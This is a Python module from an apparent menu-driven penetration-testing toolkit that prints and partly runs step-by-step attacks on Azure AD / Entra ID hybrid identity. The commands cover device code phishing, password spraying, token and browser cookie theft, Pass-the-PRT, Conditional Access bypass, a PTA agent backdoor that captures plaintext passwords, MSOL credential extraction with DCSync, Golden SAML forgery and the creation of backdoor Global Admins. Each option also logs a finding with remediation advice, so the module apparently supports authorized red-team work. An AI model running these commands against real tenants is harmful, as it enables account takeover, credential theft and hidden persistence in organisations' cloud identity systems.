"""
Module: Azure AD / Entra ID Hybrid Attacks
Techniques: AADConnect (PTA/PHS), token theft (roadtx/TokenTactics),
            device code phishing, PRT abuse, CAP bypass,
            on-prem → cloud pivot, hybrid identity attacks
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("AZURE AD / ENTRA ID", "Hybrid identity & cloud pivot attacks")
    dc   = input_or_session("dc_ip",    "On-prem DC IP")
    dom  = input_or_session("domain",   "On-prem domain (e.g. corp.local)")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")
    aad  = prompt("Azure AD tenant domain (e.g. corp.com / tenant.onmicrosoft.com)")

    print(f"""
  {C}── RECON ────────────────────────────────────────────────────────{RST}
  [1]  Tenant Recon (realm, federation, tenant ID)
  [2]  User Enumeration (o365enum / AADInternals)
  {C}── INITIAL ACCESS ────────────────────────────────────────────────{RST}
  [3]  Device Code Phishing (OAuth token theft)
  [4]  Password Spray / Stuffing (AzureAD / ADFS)
  {C}── TOKEN ATTACKS ─────────────────────────────────────────────────{RST}
  [5]  Token Theft (roadtx / TokenTacticsV2)
  [6]  Pass-the-PRT (Primary Refresh Token abuse)
  [7]  CAP Bypass (Conditional Access Policy evasion)
  {C}── HYBRID ATTACKS ────────────────────────────────────────────────{RST}
  [8]  AADConnect PTA Agent Abuse
  [9]  AADConnect PHS Hash Sync Abuse
  [10] On-Prem → Cloud Pivot (DCSync → AAD)
  {C}── POST-COMPROMISE ───────────────────────────────────────────────{RST}
  [11] Azure AD Backdoor (new admin / service principal)
  [12] roadrecon — Full Azure AD Enumeration
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        print(f"""
  {C}Azure AD Tenant Recon:{RST}

  {Y}Check federation type (federated vs managed):{RST}
  curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=test@{aad}&xml=1"
  # NameSpaceType: Federated = ADFS/PTA, Managed = PHS/cloud-only

  {Y}Get Tenant ID:{RST}
  curl -s "https://login.microsoftonline.com/{aad}/.well-known/openid-configuration" | \\
    python3 -c "import sys,json; d=json.load(sys.stdin); print(d['issuer'])"

  {Y}AADInternals — full outside recon (no creds):{RST}
  Import-Module AADInternals
  Invoke-AADIntReconAsOutsider -DomainName {aad} | Format-Table
  Get-AADIntTenantDomains -Domain {aad}
  Get-AADIntLoginInformation -UserName 'admin@{aad}'

  {Y}roadrecon gather (with creds):{RST}
  roadrecon gather -u '{user}@{aad}' -p '{pw}'
  roadrecon gui
""")
        run_cmd(
            f'curl -s "https://login.microsoftonline.com/getuserrealm.srf'
            f'?login=test@{aad}&xml=1"'
        )

    elif c == "2":
        wordlist = prompt("Username wordlist path")
        print(f"""
  {C}Azure AD / O365 User Enumeration:{RST}

  {Y}o365enum (timing-based — no lockout):{RST}
  python3 o365enum.py -u {wordlist} -d {aad} --method oauth

  {Y}AADInternals — enumerate users (no creds):{RST}
  Import-Module AADInternals
  Get-AADIntUsers -Domain {aad}
  Invoke-AADIntUserEnumerationAsOutsider -UserName "admin@{aad}"

  {Y}TREVORspray — lockout-aware enumeration:{RST}
  python3 trevorspray.py -u {wordlist} -d {aad} --spray

  {Y}Microsoft Graph API user enum (with token):{RST}
  curl -H "Authorization: Bearer <access_token>" \\
    "https://graph.microsoft.com/v1.0/users" | python3 -m json.tool
""")

    elif c == "3":
        print(f"""
  {C}Device Code Phishing — OAuth token theft:{RST}

  {Y}Concept:{RST}
  Attacker requests device code → victim enters code at microsoft.com/devicelogin
  → attacker gets access token + refresh token (no password needed!)

  {Y}Step 1 — Get device code (roadtx):{RST}
  roadtx device -t {aad} --client-id 04b07795-8ddb-461a-bbee-02f9e1bf7b46
  # Copy user_code → send to victim to enter at aka.ms/devicelogin

  {Y}Step 2 — Poll for token (runs automatically):{RST}
  roadtx listscopes
  roadtx tokenrequest -t {aad} --device

  {Y}TokenTacticsV2 (full device code flow):{RST}
  Import-Module TokenTactics
  Get-AzureToken -Client MSTeams    # Teams client ID
  # Copy code → send to victim

  {Y}AADInternals device code:{RST}
  Import-Module AADInternals
  $res = Invoke-AADIntDeviceCodeFlow -ClientId "d3590ed6-..." -Resource "https://graph.microsoft.com"
  # $res contains access + refresh tokens

  {Y}Use obtained token:{RST}
  roadtx describe --token '<access_token>'
  curl -H "Authorization: Bearer <access_token>" \\
    https://graph.microsoft.com/v1.0/me
""")
        add_finding("Device Code Phishing Vector", "High",
                    f"Device code flow active on tenant {aad} — phishing attack possible",
                    "Disable device code flow in Conditional Access; enable MFA; monitor sign-in logs")

    elif c == "4":
        wordlist = prompt("Password list")
        ulist    = prompt("Username list (user@domain format)")
        print(f"""
  {C}Azure AD Password Spray:{RST}

  {Y}MSOLSpray (smart delay — avoids lockout):{RST}
  python3 MSOLSpray.py --userlist {ulist} \\
    --password 'Winter2024!' --url https://login.microsoft.com

  {Y}TREVORspray (lockout-aware + proxy rotation):{RST}
  python3 trevorspray.py \\
    -u {ulist} \\
    -p {wordlist} \\
    -t https://login.microsoftonline.com/{aad}/oauth2/token \\
    --delay 30

  {Y}roadtx spray:{RST}
  roadtx spray -u {ulist} -p 'Spring2024!' -t {aad}

  {Y}ADFS password spray (if federated):{RST}
  python3 ruler.py --domain {aad} \\
    spray --users {ulist} \\
    --passwords {wordlist} \\
    --delay 0 --verbose
""")

    elif c == "5":
        print(f"""
  {C}Token Theft & Abuse (roadtx / TokenTacticsV2):{RST}

  {Y}roadtx — request access token:{RST}
  roadtx interactiveauth -t {aad}     # browser-based
  roadtx prt -t {aad}                 # PRT-based
  roadtx describe --token '<token>'   # decode JWT

  {Y}List / use tokens:{RST}
  roadtx listscopes
  roadtx tokenrequest -t {aad} -s https://graph.microsoft.com/.default

  {Y}TokenTacticsV2 — token manipulation:{RST}
  Import-Module TokenTactics
  $token = Get-AzureToken -Client MSGraph
  Invoke-RefreshToMSGraphToken -refreshToken $token.refresh_token -tenantId '<tid>'
  Invoke-RefreshToSharePointToken -refreshToken $token.refresh_token -tenantId '<tid>'

  {Y}Dump tokens from browser / disk (Windows):{RST}
  # Chrome tokens (if user logged in to O365):
  .\\SharpChrome.exe cookies --format=netscape
  # Token cache files:
  %LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\
  %LOCALAPPDATA%\\Microsoft\\OneAuth\\
  %APPDATA%\\Microsoft\\Teams\\Cookies
""")
        add_finding("Azure AD Token Theft", "High",
                    f"Access/refresh tokens obtained for tenant {aad}",
                    "Enable Conditional Access; use Continuous Access Evaluation; monitor token usage from new IPs")

    elif c == "6":
        print(f"""
  {C}Pass-the-PRT (Primary Refresh Token abuse):{RST}

  {Y}What is PRT:{RST}
  PRT is a long-lived token issued to Azure AD joined / registered devices.
  It allows SSO to all Azure AD resources. Stolen PRT → full account access.

  {Y}Extract PRT (Windows — on victim machine):{RST}
  # Method 1 — ROADtoken (via COM injection):
  .\\ROADtoken.exe
  # Output: PRT + session key (base64)

  {Y}Use PRT with roadtx:{RST}
  roadtx prt --prt '<prt_value>' --prt-sessionkey '<session_key>' \\
    -t {aad} -s https://graph.microsoft.com/.default

  {Y}AADInternals — extract + use PRT:{RST}
  Import-Module AADInternals
  # Extract (on victim machine — admin req):
  $prt = Get-AADIntUserPRT
  # Use PRT to get access token:
  Get-AADIntAccessTokenForAADGraph -PRTToken $prt

  {Y}Chrome nonce bypass (if PRT in browser):{RST}
  roadtx browserprtauth --prt '<prt>' --prt-sessionkey '<key>' \\
    --url "https://portal.azure.com"

  {Y}Kerberos-based PRT (AADKERB):{RST}
  roadtx prt --kerberos-prt -u '{user}@{aad}' --realm {aad}
""")
        add_finding("Pass-the-PRT", "Critical",
                    f"PRT extracted and used for SSO on tenant {aad}",
                    "Enable token protection in Conditional Access; monitor primary refresh token sign-ins; enable FIDO2")

    elif c == "7":
        print(f"""
  {C}CAP (Conditional Access Policy) Bypass:{RST}

  {Y}Common CAP bypass techniques:{RST}

  1. Legacy auth protocols (IMAP/SMTP/EWS — bypass MFA):
  python3 ruler.py --domain {aad} --email '{user}@{aad}' \\
    --password '{pw}' --verbose

  2. Non-browser client IDs (Teams/Outlook apps bypass some CAPs):
  roadtx interactiveauth -t {aad} \\
    --client-id '1fec8e78-bce4-4aaf-ab1b-5451cc387264'  # Teams

  3. Trusted named location bypass (if IP-based CAP):
  # Use proxy from trusted IP range

  4. Compliant device bypass (PRT from joined device):
  roadtx prt --prt '<prt>' --prt-sessionkey '<key>' -t {aad}

  5. MFA fatigue (push notification bombing):
  # Repeatedly trigger MFA push → victim accidentally approves

  6. ADFS / Federation bypass:
  # If on-prem ADFS has weaker policies → authenticate via ADFS
  python3 MSOLSpray.py --userlist {user} \\
    --password '{pw}' --url https://adfs.{dom}/adfs/ls/

  {Y}Enumerate existing CAPs (after compromise):{RST}
  roadrecon gather -u '{user}@{aad}' -p '{pw}'
  roadrecon gui   # View policies in browser
""")

    elif c == "8":
        pta_server = prompt("PTA Agent server IP (usually on an on-prem server)")
        print(f"""
  {C}AADConnect PTA Agent Abuse:{RST}

  {Y}What is PTA:{RST}
  Pass-Through Authentication — on-prem agent validates passwords for Azure AD.
  Compromised PTA agent = intercept ALL Azure AD authentications in plaintext!

  {Y}Step 1 — Find PTA agent (usually on AADConnect server or separate agent):{RST}
  nxc smb {pta_server} -u '{user}' -p '{pw}' -d {dom}
  # Look for: AzureADConnectAuthenticationAgent service

  {Y}Step 2 — Install backdoor PTA agent (AADInternals):{RST}
  # Run on AADConnect server (admin required):
  Import-Module AADInternals
  Install-AADIntPTASpy
  # All authentication attempts now logged to:
  # C:\\PTASpy\\PTASpy.csv  (plaintext username + password!)

  {Y}Step 3 — Read captured credentials:{RST}
  Get-AADIntPTASpyLogs

  {Y}Patch PTA agent (accept ANY password — universal backdoor):{RST}
  # Run on AADConnect server:
  Set-AADIntDesktopSSO -Enable $true
  Install-AADIntPTASpy
  Invoke-AADIntPTASpy   # Accept all auths regardless of password
""")
        add_finding("PTA Agent Backdoor", "Critical",
                    f"PTA spy installed on {pta_server} — all Azure AD auths captured in plaintext",
                    "Audit PTA agent servers; monitor AADInternals module usage; implement SIEM alerts for PTA agent changes")

    elif c == "9":
        print(f"""
  {C}AADConnect PHS (Password Hash Sync) Abuse:{RST}

  {Y}What is PHS:{RST}
  Password Hash Sync — on-prem AD password hashes synced to Azure AD.
  AADConnect service account (MSOL_<id>) has DCSync-like rights on domain!

  {Y}Step 1 — Find MSOL service account:{RST}
  # Find AADConnect server:
  Get-ADUser -Filter "name -like 'MSOL_*'" -Properties * | \\
    Select-Object Name,SamAccountName,Description

  {Y}Step 2 — Extract MSOL account credentials (from AADConnect server):{RST}
  # On AADConnect server (admin req):
  Import-Module AADInternals
  Get-AADIntSyncCredentials
  # Output: MSOL_ account username + plaintext password!

  {Y}Step 3 — DCSync with MSOL account:{RST}
  impacket-secretsdump {dom}/MSOL_<id>:'<password>'@{dc} \\
    -just-dc-ntlm

  {Y}Step 4 — Sync arbitrary password hashes to Azure AD:{RST}
  Import-Module AADInternals
  $creds = Get-AADIntSyncCredentials
  Set-AADIntAzureADObject -CloudAnchor '<CloudAnchor>' \\
    -PasswordHash '<NTLM_hash>' -SourceAnchor '<ObjectGUID>'
""")
        add_finding("AADConnect PHS Abuse / MSOL Account Compromise", "Critical",
                    f"MSOL service account credentials extracted; DCSync possible on {dc}",
                    "Protect AADConnect server as Tier 0 asset; audit MSOL_ account usage; monitor DCSync events (4662)")

    elif c == "10":
        print(f"""
  {C}On-Premises → Cloud Pivot via DCSync → Azure AD:{RST}

  {Y}Concept:{RST}
  If domain is synced with Azure AD (PHS/PTA),
  the krbtgt hash or privileged account hashes synced to cloud
  can be used to forge Azure AD tokens (SAML token forgery / Golden SAML).

  {Y}Step 1 — DCSync / get ADFS signing cert (Golden SAML):{RST}
  # Get ADFS token signing certificate (from ADFS server):
  Import-Module AADInternals
  Export-AADIntADFSSigningCertificate
  # or via AD CS if ADFS cert enrolled there

  {Y}Step 2 — Forge SAML token (AADInternals Golden SAML):{RST}
  $cert = Get-Item "Cert:\\LocalMachine\\My\\<thumbprint>"
  Open-AADIntOffice365Shell -SAML (New-AADIntSAMLToken \\
    -UPN 'admin@{aad}' -ImmutableId '<ImmutableID>' \\
    -Certificate $cert)

  {Y}Step 3 — Access Azure AD as any user:{RST}
  # Token works for all Azure AD resources (Exchange, SharePoint, Graph)

  {Y}Sync password hash of any user to Azure AD:{RST}
  # With DCSync rights + AAD sync creds:
  Set-AADIntUserPassword -SourceAnchor '<guid>' \\
    -Password 'NewPass123!' -ChangeDate (Get-Date)
""")
        add_finding("Golden SAML / On-Prem to Cloud Pivot", "Critical",
                    f"ADFS signing certificate obtained; Golden SAML token forging possible for {aad}",
                    "Protect ADFS servers as Tier 0; enable Advanced Threat Protection for ADFS; audit token signing cert")

    elif c == "11":
        bd_user = prompt("Backdoor user UPN (e.g. backdoor@corp.com)")
        bd_pass = prompt("Backdoor password")
        print(f"""
  {C}Azure AD Backdoor (new Global Admin / Service Principal):{RST}

  {Y}Add Global Admin via Graph API (with existing GA token):{RST}
  # Create new user:
  curl -X POST \\
    -H "Authorization: Bearer <ga_token>" \\
    -H "Content-Type: application/json" \\
    -d '{{"userPrincipalName":"{bd_user}","displayName":"Support","password":"{bd_pass}","accountEnabled":true}}' \\
    https://graph.microsoft.com/v1.0/users

  # Assign Global Admin role (roleTemplateId = 62e90394-...):
  curl -X POST \\
    -H "Authorization: Bearer <ga_token>" \\
    -H "Content-Type: application/json" \\
    -d '{{"@odata.id":"https://graph.microsoft.com/v1.0/directoryObjects/<user_id>"}}' \\
    "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments"

  {Y}Add backdoor service principal with client secret:{RST}
  roadtx serviceprincipal --create -n 'Windows Update Helper' \\
    --role 'Global Administrator' -t {aad}

  {Y}AADInternals — create backdoor admin:{RST}
  Import-Module AADInternals
  New-AADIntUser -UserPrincipalName '{bd_user}' \\
    -Password '{bd_pass}' -GlobalAdmin
""")
        add_finding("Azure AD Backdoor Admin Created", "Critical",
                    f"Backdoor Global Admin '{bd_user}' created in tenant {aad}",
                    "Enable PIM with justification + approval for GA activation; alert on new GA role assignments; audit service principals")

    elif c == "12":
        print(f"""
  {C}roadrecon — Full Azure AD Enumeration:{RST}

  {Y}Gather all data (interactive auth):{RST}
  roadrecon gather -u '{user}@{aad}' -p '{pw}'
  roadrecon gather --device-code     # device code flow
  roadrecon gather --access-token '<token>'

  {Y}Gather specific resources:{RST}
  roadrecon gather --mfa              # MFA registration data
  roadrecon gather --groups           # Group memberships
  roadrecon gather --users            # All users + metadata
  roadrecon gather --devices          # Registered devices
  roadrecon gather --applications     # App registrations
  roadrecon gather --servicePrincipals

  {Y}Export to file:{RST}
  roadrecon gather -u '{user}@{aad}' -p '{pw}' -f /tmp/roadrecon_{aad}.db

  {Y}GUI (web-based visualization):{RST}
  roadrecon gui --listen 127.0.0.1:5000
  # Open http://127.0.0.1:5000 in browser

  {Y}BloodHound Azure (AzureHound):{RST}
  azurehound -u '{user}@{aad}' -p '{pw}' list all \\
    -t {aad} -o /tmp/azurehound_{aad}.json
  # Import into BloodHound → Azure attack paths
""")
        run_cmd(f"roadrecon gather -u '{user}@{aad}' -p '{pw}'")

    pause()
